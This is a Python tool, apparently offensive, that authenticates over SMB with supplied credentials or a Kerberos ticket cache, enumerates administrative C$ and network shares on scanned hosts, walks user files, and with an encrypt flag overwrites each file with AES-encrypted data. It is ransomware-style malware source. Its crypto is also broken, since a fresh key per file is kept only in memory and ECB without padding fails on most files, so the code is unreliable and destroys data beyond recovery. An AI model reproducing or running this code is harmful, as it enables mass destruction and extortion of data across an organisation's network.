import argparse
import logging
import socket
import smbclient
from impacket.smbconnection import SMBConnection
from src.scan_network import NetworkScanner
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

class NetworkTriage:
    def __init__(self):
        self.machine_hits = []
        self.hit_network_share_system = []
        self.hit_share_names = []
        self.encryptionKey = ''
        self.filePaths = []
        self.encrypt_confirmation = False

    logging.getLogger("smbprotocol").setLevel(logging.CRITICAL)
    logging.getLogger("smbclient").setLevel(logging.CRITICAL)

    def encryptSingleFile(self, filePath):
        try:
            with open(filePath, 'rb') as f:
                data = f.read()
                key = get_random_bytes(32)
                cipher = AES.new(key, AES.MODE_ECB)
                encrypted_data = cipher.encrypt(data)
                with open(filePath, 'wb') as f:
                    f.write(encrypted_data) 
                print(f"[+] Encryption key: {key}")
                self.encryptionKey = key
        except Exception as e:
            print(f'[!] Error encrypting file: {filePath}')

    def decryptSingleFile(self, filePath, key):
        try:
            with open(filePath, 'rb') as f:
                data = f.read()
                cipher = AES.new(key, AES.MODE_ECB)
                decrypted_data = cipher.decrypt(data)
                with open(filePath, 'wb') as f:
                    f.write(decrypted_data) 
                    print(f"[+] Decrypting {filePath}")
        except Exception as e:
            print(f'[!] Error decrypting file: {filePath}')

    def encryptFastAes256(self, filePath):
        try:
            file_queue = Queue()
            file_queue.put(filePath)
            # detect CPU cores for faster encryption
            cpu_count = os.cpu_count()
            print(f'[+] Detected {cpu_count} CPU cores')
            with ThreadPoolExecutor(max_workers=cpu_count) as executor:
                for _ in executor.map(self.encryptSingleFile, file_queue):
                    pass
                print(f'[+] Encrypted all files on C:\\Users\\ at {computer} with AES256 encryption')
        except Exception as e:
            print('[!] Error encrypting file: %s' % e)

    def walk_network_shares(self, args):
        for share in self.hit_share_names:
            if share != 'C$':
                print(f"[+] Walking {share}")
                self.filePaths.append(f"\\\\{self.hit_network_share_system[0]}\\{share}\\")
                for root, dirs, files in os.walk(f"\\\\{self.hit_network_share_system[0]}\\{share}\\"):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.filePaths.append(file_path)
                        print(f"[+] Found file: {file_path}")
                        
                        if self.encrypt_confirmation:
                            print('[+] Encrypting file: %s' % file_path)
                            self.encryptFastAes256(file_path)
                        else:
                            print("[+] Not Encrypting.")

    def walk_network_computers(self, args):
        try:
            if args.encrypt:
                self.encrypt_confirmation = True

            network_share_thread = threading.Thread(target=self.walk_network_shares, args=(args,))
            network_share_thread.start()
            for computer in self.machine_hits:
                print(f"[+] Walking {computer}")
                
                base_path = f"\\\\{computer}\\C$\\Users"
                self.filePaths.append(base_path)
                
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.filePaths.append(file_path)
                        print(f"[+] Found file: {file_path}")
                        
                        if self.encrypt_confirmation:
                            print('[+] Encrypting file: %s' % file_path)
                            self.encryptFastAes256(file_path)
                        else:
                            print("[+] Not Encrypting.")
                            
        except Exception as e:
            print('[!] Error walking network computers: %s' % e)



    def is_smb_port_open(self, host, port=445, timeout=2.0):
        """Check whether SMB is available on the target."""
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True

        except (socket.timeout, ConnectionRefusedError, OSError):
            return False


    def configure_smb(self, args):
        """Configure SMB authentication for explicit credentials."""

        if args.ptt:
            return

        smbclient.ClientConfig(
            username=args.username,
            password=args.password,
            domain=args.domain
        )


    def check_machine(self, host):
        """Attempt to access the target's C$ administrative share."""

        try:
            path = f"\\\\{host}\\C$"
            contents = smbclient.listdir(path)

            if host not in self.machine_hits:
                self.machine_hits.append(host)

            print(f"[+] {path}")

            for item in contents:
                print(f"    {item}")

            return True

        except Exception:
            return False


    def get_network_shares(self, host, args):
        """Enumerate the SMB shares published by the target."""
        connection = None
        try:
            connection = SMBConnection(
                host,
                host,
                sess_port=445
            )

            if args.ptt:
                connection.kerberosLogin(
                    "",
                    "",
                    "",
                    useCache=True
                )

            else:
                connection.login(
                    args.username,
                    args.password,
                    args.domain
                )

            if args.encrypt:
                self.encrypt_confirmation = True

            shares = connection.listShares()
            share_names = []

            for share in shares:
                name = share["shi1_netname"][:-1]

                if name in (
                    "IPC$",
                    "ADMIN$",
                    "C$"
                ):
                    continue

                if name not in share_names:
                    share_names.append(name)

            return share_names

        except Exception:
            return []

        finally:
            if connection:
                try:
                    connection.logoff()
                except Exception:
                    pass


    def check_network_shares(self, host, shares):
        """Attempt to access each discovered network share."""
        for share in shares:
            path = f"\\\\{host}\\{share}"

            try:
                contents = smbclient.listdir(path)
            except Exception:
                continue

            if host not in self.machine_hits:
                self.machine_hits.append(host)

            if host not in self.hit_network_share_system:
                self.hit_network_share_system.append(host)

            if share not in self.hit_share_names:
                self.hit_share_names.append(share)

            print(f"[+] {path}")
            for item in contents:
                print(f"    {item}")



    def print_results(self, args):
        """Print all successful SMB results."""
        print("\n[*] Machine hits")

        for host in sorted(self.machine_hits):
            print(f"    {host}")
        print("\n[*] Network share systems")

        for host in sorted(self.hit_network_share_system):
            print(f"    {host}")
        print("\n[*] Share names")

        for share in sorted(self.hit_share_names):
            print(f"    {share}")
        
        print(f'\n[*] Beginning to walk {self.hit_network_share_system}\n{self.machine_hits}')
        self.walk_network_computers(args)


    def parse_arguments(self):
        """Parse command line arguments."""
        parser = argparse.ArgumentParser(
            description="SMB network share scanner.",
            epilog=(
                "Examples:\n"
                "  python scanner.py -d UNDERWRLD -u baphomet -p password\n"
                "  python scanner.py -ptt"
            ),
            formatter_class=argparse.RawDescriptionHelpFormatter
        )

        parser.add_argument("-d","--domain",metavar="DOMAIN",help="Windows domain name.")
        parser.add_argument("-u","--username",metavar="USERNAME",help="Username to authenticate with.")
        parser.add_argument("-p","--password",metavar="PASSWORD",help="Password to authenticate with.")
        parser.add_argument("-dc","--decryption-key",metavar="DECRYPTION_KEY",help="Provide a decryption key to decrypt all files.")
        parser.add_argument("-en","--encrypt",action="store_true",help="Encrypt all files discovered on systems and network shares.")
        parser.add_argument("-ptt",action="store_true",help="Use the current Windows authentication context.")
        args = parser.parse_args()
        credential_mode = any(value is not None for value in (args.domain,args.username,args.password))

        if args.ptt and credential_mode:
            parser.error("-ptt cannot be combined with -d, -u, or -p.")

        if not args.ptt and not all(value is not None for value in (args.domain,args.username,args.password)):
            parser.error("provide -d, -u, and -p, or use -ptt.")
        return args


    def being_task(self):
        """Scan discovered hosts for C$ and network shares."""
        args = self.parse_arguments()
        self.configure_smb(args)
        scanner = NetworkScanner()
        hosts = scanner.scan()

        for host in hosts:
            if not self.is_smb_port_open(host):
                continue

            self.check_machine(host)
            shares = self.get_network_shares(host,args)

            if shares:
                self.check_network_shares(host,shares)

        self.print_results(args)


if __name__ == "__main__":
    main = NetworkTriage()
    main.being_task()